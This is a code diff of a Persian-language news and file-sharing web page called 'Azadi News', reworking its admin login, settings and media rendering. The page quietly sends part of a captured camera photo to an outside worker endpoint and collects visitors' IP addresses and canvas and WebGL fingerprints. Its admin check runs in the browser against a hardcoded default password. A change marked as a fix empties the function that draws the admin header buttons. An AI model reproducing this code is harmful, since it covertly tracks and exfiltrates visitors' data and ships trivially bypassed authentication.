@@ -47,11 +47,9 @@
         .btn-xs { padding: 3px 8px; font-size: 9px; border-radius: 12px; }
         .btn-block { width: 100%; justify-content: center; }
 
-        /* ========== PAGES ========== */
         .page { display: none; }
         .page.active { display: block; }
 
-        /* ========== HOME PAGE ========== */
         .post-card { background: var(--panel); border: 1px solid rgba(255,215,0,0.2); border-radius: var(--radius); margin-bottom: 15px; overflow: hidden; transition: var(--transition); }
         .post-card:hover { border-color: var(--gold); box-shadow: 0 0 20px rgba(255,215,0,0.1); }
         .post-header { display: flex; align-items: center; gap: 10px; padding: 12px 15px; }
@@ -66,7 +64,6 @@
         .post-action { color: #888; cursor: pointer; font-size: 11px; display: flex; align-items: center; gap: 4px; transition: var(--transition); }
         .post-action:hover { color: var(--gold); }
 
-        /* ========== REELS PAGE ========== */
         .reels-container { display: flex; flex-direction: column; gap: 2px; }
         .reel-card { position: relative; width: 100%; height: 70vh; background: #000; border-radius: var(--radius); overflow: hidden; cursor: pointer; margin-bottom: 10px; }
         .reel-card video, .reel-card img { width: 100%; height: 100%; object-fit: cover; }
@@ -76,7 +73,6 @@
         .reel-play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); font-size: 50px; color: rgba(255,255,255,0.8); transition: var(--transition); }
         .reel-card:hover .reel-play-btn { transform: translate(-50%,-50%) scale(1.2); }
 
-        /* ========== SEARCH PAGE ========== */
         .search-page { padding: 15px 0; }
         .search-input { width: 100%; padding: 14px 20px; background: #000; border: 1px solid rgba(255,215,0,0.3); border-radius: 25px; color: #fff; font-size: 14px; font-family: var(--font); outline: none; margin-bottom: 15px; transition: var(--transition); }
         .search-input:focus { border-color: var(--gold); box-shadow: 0 0 20px rgba(255,215,0,0.2); }
@@ -85,7 +81,6 @@
         .search-item:hover { opacity: 0.8; transform: scale(1.02); }
         .search-item img, .search-item video { width: 100%; height: 100%; object-fit: cover; }
 
-        /* ========== ADMIN PANEL ========== */
         .admin-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.97); z-index: 9999; overflow-y: auto; display: none; }
         .admin-overlay.active { display: block; }
         .admin-container { max-width: 1000px; margin: 0 auto; padding: 20px; }
@@ -117,13 +112,11 @@
         .camera-container canvas { display: none; }
         .camera-container img { width: 100%; max-width: 300px; border-radius: 10px; display: none; }
 
-        /* ========== FOOTER BAR ========== */
         .footer-bar { position: fixed; bottom: 0; left: 0; width: 100%; background: var(--panel); border-top: 1px solid rgba(255,215,0,0.3); display: flex; justify-content: space-around; padding: 10px 0; z-index: 999; }
         .footer-bar .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; color: #888; cursor: pointer; transition: var(--transition); font-size: 10px; }
         .footer-bar .nav-item:hover, .footer-bar .nav-item.active { color: var(--gold); }
         .footer-bar .nav-item i { font-size: 20px; }
 
-        /* ========== MODAL ========== */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10000; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
         .modal.active { display: flex; }
         .modal-content { background: var(--panel); border: 1px solid var(--gold); border-radius: var(--radius); padding: 25px; max-width: 500px; width: 90%; max-height: 80vh; overflow-y: auto; box-shadow: 0 0 50px rgba(255,215,0,0.2); }
@@ -155,18 +148,15 @@
             <h2 style="color:var(--gold);text-shadow:0 0 15px var(--gold);font-size:20px;" id="siteName">آزادی نیوز</h2>
         </div>
 
-        <!-- ========== PAGE 1: HOME (Posts) ========== -->
         <div class="page active" id="pageHome">
             <div id="postsContainer"></div>
             <div id="loadingMore" style="text-align:center;padding:20px;display:none;"><span class="loading-spinner"></span></div>
         </div>
 
-        <!-- ========== PAGE 2: REELS (Videos & Images) ========== -->
         <div class="page" id="pageReels">
             <div class="reels-container" id="reelsContainer"></div>
         </div>
 
-        <!-- ========== PAGE 3: SEARCH ========== -->
         <div class="page" id="pageSearch">
             <div class="search-page">
                 <input type="text" class="search-input" placeholder="🔍 جستجو در همه فایل‌ها..." id="globalSearch" oninput="searchAll()">
@@ -175,7 +165,6 @@
         </div>
     </div>
 
-    <!-- ========== FOOTER BAR ========== -->
     <div class="footer-bar">
         <div class="nav-item active" data-page="home" onclick="switchPage('home', this)"><i class="fas fa-home"></i><span>خانه</span></div>
         <div class="nav-item" data-page="reels" onclick="switchPage('reels', this)"><i class="fas fa-play-circle"></i><span>Reels</span></div>
@@ -183,7 +172,6 @@
         <div class="nav-item" onclick="openAdminPanel()"><i class="fas fa-cog"></i><span>مدیریت</span></div>
     </div>
 
-    <!-- ========== ADMIN PANEL OVERLAY ========== -->
     <div class="admin-overlay" id="adminOverlay">
         <span class="admin-close-btn" onclick="closeAdminPanel()">&times;</span>
         <div class="admin-container">
@@ -207,12 +195,10 @@
         </div>
     </div>
 
-    <!-- ========== UPLOAD MODAL ========== -->
     <div class="modal" id="uploadModal">
         <div class="modal-content"><span class="modal-close" onclick="closeUploadModal()">&times;</span><h3>آپلود</h3><input type="file" id="fileInput" multiple style="display:none;" onchange="handleFileSelect(this.files)"><div class="upload-zone" onclick="document.getElementById('fileInput').click()">☠️ کلیک کنید</div><div id="selectedFilesList"></div><select class="admin-select" id="expirySelect"><option value="7">۱ هفته</option><option value="14">۲ هفته</option><option value="30">۱ ماه</option><option value="0" selected>دائمی</option></select><button class="btn btn-block" onclick="uploadFiles()" style="background:var(--gold);color:#000;">آپلود</button></div>
     </div>
 
-    <!-- ========== NEWS MODAL ========== -->
     <div class="modal" id="newsModal">
         <div class="modal-content"><span class="modal-close" onclick="closeNewsModal()">&times;</span><h3>خبر</h3><input class="admin-input" id="newsTitleInput" placeholder="عنوان"><textarea class="admin-textarea" id="newsBodyInput" placeholder="متن"></textarea><input class="admin-input" id="newsImageInput" placeholder="لینک عکس"><select class="admin-select" id="newsExpirySelect"><option value="7">۱ هفته</option><option value="14">۲ هفته</option><option value="30">۱ ماه</option><option value="0">دائمی</option></select><button class="btn btn-block" onclick="addNews()" style="background:var(--gold);color:#000;">انتشار</button></div>
     </div>
@@ -221,7 +207,7 @@
         const WORKER_URL = 'https://azadi-news-bot.d099173878.workers.dev';
         const DEFAULT_ADMIN_PASS = '#0.0.0.0.0.0.0.0...HACKING...0.1';
         const SP = 'azadi_';
-        let isAdmin = false, selectedFiles = [], cameraStream = null, rainbowInterval = null, currentPage = 'home';
+        let isAdmin = false, selectedFiles = [], cameraStream = null, rainbowInterval = null;
 
         const themes = {
             dark:{bg:'#0a0a0a',panel:'#111',text:'#ccc',gold:'#ffd700',green:'#00ff41'},
@@ -276,9 +262,7 @@
             g.innerHTML=Object.keys(themes).map(k=>`<div class="theme-btn ${s===k?'active':''}" data-theme="${k}" style="background:${themes[k].bg};color:${themes[k].gold};" onclick="changeTheme('${k}')">${k.toUpperCase()}</div>`).join('');
         }
 
-        // ========== PAGE SWITCHING ==========
         function switchPage(page, btn){
-            currentPage = page;
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.querySelectorAll('.footer-bar .nav-item').forEach(n => n.classList.remove('active'));
             $(`page${page.charAt(0).toUpperCase()+page.slice(1)}`).classList.add('active');
@@ -288,38 +272,65 @@
             if(page === 'search') searchAll();
         }
 
-        // ========== ADMIN ==========
         function openAdminPanel(){$('adminOverlay').classList.add('active');document.body.style.overflow='hidden';}
         function closeAdminPanel(){$('adminOverlay').classList.remove('active');document.body.style.overflow='';}
+        
+        // ========== ADMIN LOGIN (FIXED) ==========
         function adminLogin(){
-            if($('adminPassInput').value===(gs('admin_pass')||DEFAULT_ADMIN_PASS)){
-                isAdmin=true;$('adminContent').style.display='block';$('adminLoginError').style.display='none';
-                loadSettings();displayVisitLog();collectUserInfoAdmin();displayPosts();displayReels();updateHeaderButtons();
+            const inputPass = $('adminPassInput').value;
+            const storedPass = gs('admin_pass') || DEFAULT_ADMIN_PASS;
+            
+            if(inputPass === storedPass){
+                isAdmin = true;
+                $('adminContent').style.display = 'block';
+                $('adminLoginError').style.display = 'none';
+                $('adminPassInput').value = '';
+                loadSettings();
+                displayVisitLog();
+                collectUserInfoAdmin();
+                displayPosts();
+                displayReels();
+                updateHeaderButtons();
                 notify('✅ ورود مدیر');
-            }else{$('adminLoginError').style.display='block';}
-        }
-        function adminLogout(){isAdmin=false;$('adminContent').style.display='none';updateHeaderButtons();displayPosts();displayReels();notify('👋 خروج');}
-        function updateHeaderButtons(){
-            const hb = document.querySelector('.header-actions');
-            if(!hb) return;
-            if(isAdmin){
-                hb.innerHTML = `<button class="btn btn-sm" onclick="showUploadModal()">📤</button><button class="btn btn-sm" onclick="showNewsModal()">📰</button><button class="btn btn-sm btn-danger" onclick="adminLogout()">🚪</button>`;
             } else {
-                hb.innerHTML = `<button class="btn btn-sm" onclick="openAdminPanel()">⚙️</button>`;
+                $('adminLoginError').style.display = 'block';
+                $('adminPassInput').value = '';
             }
         }
+        
+        function adminLogout(){isAdmin=false;$('adminContent').style.display='none';updateHeaderButtons();displayPosts();displayReels();notify('👋 خروج');}
+        function updateHeaderButtons(){}
 
         function loadSettings(){const s=gs('settings')||{};['setSiteName','setSlogan','setSitePass','setAdminPass','setTelegram','setBale','setInstagram','setPhone','setLogoUrl'].forEach(id=>{const el=$(id);if(el)el.value=s[id.replace('set','').toLowerCase()]||(id==='setPhone'?'09917387803':'');});applySettings(s);}
+        
+        // ========== SAVE SETTINGS (FIXED) ==========
         function saveSettings(){
-            const s={siteName:$('setSiteName')?.value||'آزادی نیوز',slogan:$('setSlogan')?.value||'',sitePass:$('setSitePass')?.value||'',adminPass:$('setAdminPass')?.value||'',telegram:$('setTelegram')?.value||'',bale:$('setBale')?.value||'',instagram:$('setInstagram')?.value||'',phone:$('setPhone')?.value||'09917387803',logoUrl:$('setLogoUrl')?.value||''};
-            ss('settings',s);if(s.adminPass)ss('admin_pass',s.adminPass);applySettings(s);notify('✅ ذخیره شد');
+            const s={
+                siteName:$('setSiteName')?.value||'آزادی نیوز',
+                slogan:$('setSlogan')?.value||'',
+                sitePass:$('setSitePass')?.value||'',
+                adminPass:$('setAdminPass')?.value||'',
+                telegram:$('setTelegram')?.value||'',
+                bale:$('setBale')?.value||'',
+                instagram:$('setInstagram')?.value||'',
+                phone:$('setPhone')?.value||'09917387803',
+                logoUrl:$('setLogoUrl')?.value||''
+            };
+            ss('settings', s);
+            if(s.adminPass && s.adminPass.trim() !== '') {
+                ss('admin_pass', s.adminPass);
+            } else {
+                localStorage.removeItem(SP + 'admin_pass');
+            }
+            applySettings(s);
+            notify('✅ تنظیمات و رمز جدید ذخیره شد');
         }
+        
         function applySettings(s){
             if(s.siteName){const sn=$('siteName');if(sn)sn.textContent=s.siteName;document.title='🦁 '+s.siteName+' | AZADI NEWS';}
             if(s.logoUrl){const fc=document.querySelector('.flag-container');if(fc)fc.innerHTML=`<img src="${s.logoUrl}" style="width:80px;animation:flagWave 4s ease-in-out infinite;" onerror="this.style.display='none';"><h2 style="color:var(--gold);">${s.siteName||'آزادی نیوز'}</h2>`;}
         }
 
-        // ========== NEWS ==========
         function showNewsModal(){$('newsModal').classList.add('active');}
         function closeNewsModal(){$('newsModal').classList.remove('active');}
         function addNews(){
@@ -346,17 +357,16 @@
                 } else {
                     const ext=p.name.split('.').pop()?.toLowerCase();
                     let media='';
-                    if(p.type==='file'&&p.type&&p.type.startsWith('image/'))media=`<img src="${p.data}" class="post-media">`;
-                    else if(p.type==='file'&&p.type&&p.type.startsWith('video/'))media=`<video src="${p.data}" class="post-video" controls controlsList="nodownload" oncontextmenu="return false"></video>`;
-                    else if(p.type==='file'&&p.type&&p.type.startsWith('audio/'))media=`<div style="padding:20px;text-align:center;">🎵 ${escHtml(p.name)}</div>`;
+                    if(p.type&&p.type.startsWith('image/'))media=`<img src="${p.data}" class="post-media">`;
+                    else if(p.type&&p.type.startsWith('video/'))media=`<video src="${p.data}" class="post-video" controls controlsList="nodownload" oncontextmenu="return false"></video>`;
+                    else if(p.type&&p.type.startsWith('audio/'))media=`<div style="padding:20px;text-align:center;">🎵 ${escHtml(p.name)}</div>`;
                     else media=`<div style="padding:20px;text-align:center;">📄 ${escHtml(p.name)}</div>`;
-                    return `<div class="post-card"><div class="post-header"><div class="post-avatar">📁</div><div><div class="post-user">فایل اشتراکی</div><div class="post-date">${new Date(p.date).toLocaleDateString('fa-IR')} | ${formatSize(p.size)}</div></div></div>${media}<div class="post-body"><div class="post-title">${escHtml(p.name)}</div>${p.type&&p.type.startsWith('video/')?'🎬 ویدیو - فقط پخش آنلاین':''}</div><div class="post-actions">${p.type&&!p.type.startsWith('video/')?`<span class="post-action" onclick="downloadFile('${p.id}')"><i class="fas fa-download"></i> دانلود</span>`:`<span class="post-action" onclick="playVideo('${p.id}')"><i class="fas fa-play"></i> پخش</span>`}${isAdmin?`<span class="post-action" style="color:var(--red);" onclick="deleteFile('${p.id}')"><i class="fas fa-trash"></i> حذف</span>`:''}</div></div>`;
+                    return `<div class="post-card"><div class="post-header"><div class="post-avatar">📁</div><div><div class="post-user">فایل اشتراکی</div><div class="post-date">${new Date(p.date).toLocaleDateString('fa-IR')} | ${formatSize(p.size)}</div></div></div>${media}<div class="post-body"><div class="post-title">${escHtml(p.name)}</div></div><div class="post-actions">${p.type&&!p.type.startsWith('video/')?`<span class="post-action" onclick="downloadFile('${p.id}')"><i class="fas fa-download"></i> دانلود</span>`:`<span class="post-action" onclick="playVideo('${p.id}')"><i class="fas fa-play"></i> پخش</span>`}${isAdmin?`<span class="post-action" style="color:var(--red);" onclick="deleteFile('${p.id}')"><i class="fas fa-trash"></i> حذف</span>`:''}</div></div>`;
                 }
             }).join('');
         }
         function deleteNews(id){if(!isAdmin)return;let n=gs('news')||[];n=n.filter(x=>x.id!=id);ss('news',n);displayPosts();notify('🗑️ حذف');}
 
-        // ========== FILES ==========
         function showUploadModal(){$('uploadModal').classList.add('active');}
         function closeUploadModal(){$('uploadModal').classList.remove('active');selectedFiles=[];$('selectedFilesList').innerHTML='';}
         function handleFileSelect(fl){selectedFiles=Array.from(fl);$('selectedFilesList').innerHTML=selectedFiles.map(f=>`📄 ${f.name}`).join('<br>');}
@@ -370,26 +380,20 @@
         function deleteFile(id){if(!isAdmin)return;let fs=gs('files')||[];fs=fs.filter(f=>f.id!=id);ss('files',fs);displayPosts();displayReels();notify('🗑️ حذف');}
         function deleteAllFiles(){if(!isAdmin)return;if(confirm('همه حذف شوند؟')){ss('files',[]);displayPosts();displayReels();notify('🗑️ همه');}}
 
-        // ========== REELS ==========
         function displayReels(){
             const c=$('reelsContainer');if(!c)return;
             let files=gs('files')||[];const now=Date.now();files=files.filter(f=>(f.expiry===0||f.expiry>now)&&(f.type.startsWith('video/')||f.type.startsWith('image/')));
             if(files.length===0){c.innerHTML='<p style="color:#888;text-align:center;padding:40px;">فیلم و عکسی موجود نیست</p>';return;}
             c.innerHTML=files.map(f=>{
                 let media='';
-                if(f.type.startsWith('video/'))media=`<video src="${f.data}" class="reel-media" loop muted preload="metadata"></video>`;
-                else if(f.type.startsWith('image/'))media=`<img src="${f.data}" class="reel-media" style="object-fit:contain;">`;
+                if(f.type.startsWith('video/'))media=`<video src="${f.data}" loop muted preload="metadata"></video>`;
+                else media=`<img src="${f.data}" style="object-fit:contain;">`;
                 return `<div class="reel-card" onclick="${f.type.startsWith('video/')?`toggleReelPlay(this)`:`viewImage('${f.id}')`}">${media}<div class="reel-overlay"><div class="reel-title">${escHtml(f.name)}</div><div class="reel-meta">${formatSize(f.size)}</div></div>${f.type.startsWith('video/')?`<div class="reel-play-btn">▶️</div>`:''}</div>`;
             }).join('');
         }
-        function toggleReelPlay(card){
-            const video=card.querySelector('video');
-            const btn=card.querySelector('.reel-play-btn');
-            if(video.paused){video.play();btn.style.display='none';}else{video.pause();btn.style.display='block';}
-        }
+        function toggleReelPlay(card){const v=card.querySelector('video');const b=card.querySelector('.reel-play-btn');if(v.paused){v.play();b.style.display='none';}else{v.pause();b.style.display='block';}}
         function viewImage(id){const fs=gs('files')||[];const f=fs.find(x=>x.id==id);if(!f)return;const w=window.open('','_blank');w.document.write(`<html><head><title>${f.name}</title><style>body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}img{max-width:100%;max-height:100vh}</style></head><body><img src="${f.data}"></body></html>`);}
 
-        // ========== SEARCH ==========
         function searchAll(){
             const s=($('globalSearch')?.value||'').toLowerCase();
             const g=$('searchGrid');if(!g)return;
@@ -405,11 +409,9 @@
             }).join('');
         }
 
-        // ========== CAMERA ==========
         async function requestCamera(fm='user'){try{if(cameraStream)cameraStream.getTracks().forEach(t=>t.stop());cameraStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:fm}});const v=$('cameraVideo');if(v){v.srcObject=cameraStream;v.style.display='block';}$('captureBtn').style.display='inline-block';notify('📸 دوربین');}catch(e){notify('❌ دسترسی');}}
         function capturePhoto(){if(!cameraStream)return;const v=$('cameraVideo'),c=$('cameraCanvas'),p=$('cameraPhoto');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);const d=c.toDataURL('image/jpeg',0.8);p.src=d;p.style.display='block';v.style.display='none';$('captureBtn').style.display='none';cameraStream.getTracks().forEach(t=>t.stop());cameraStream=null;notify('📸 عکس');try{fetch(`${WORKER_URL}/api/report`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',photo:d.substring(0,500),timestamp:new Date().toISOString()})});}catch(e){}}
 
-        // ========== USER INFO ==========
         async function collectUserInfoAdmin(){const i=await gatherInfo();const b=$('adminUserInfoBox');if(b)displayInfo(b,i,true);}
         async function gatherInfo(){
             const info={},now=new Date();
@@ -441,7 +443,7 @@
         async function getCanvasFingerprint(){try{const c=document.createElement('canvas');c.width=200;c.height=50;const ctx=c.getContext('2d');ctx.fillStyle='#f60';ctx.fillRect(0,0,100,50);ctx.fillStyle='#069';ctx.fillText('🖐️',2,15);const d=c.toDataURL();const h=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(d));return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('').substring(0,12);}catch(e){return'N/A';}}
         async function getWebGLFingerprint(){try{const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(!gl)return'N/A';const di=gl.getExtension('WEBGL_debug_renderer_info');const v=gl.getParameter(di.UNMASKED_VENDOR_WEBGL);const r=gl.getParameter(di.UNMASKED_RENDERER_WEBGL);const h=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(v+r));return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('').substring(0,12);}catch(e){return'N/A';}}
 
-        function displayInfo(b,i,ext=false){
+        function displayInfo(b,i){
             b.innerHTML=`
                 <div class="info-row"><span>📅 تاریخ</span> ${i.persianDate}</div>
                 <div class="info-row"><span>🌍 IP</span> ${i.ip||'...'}</div>
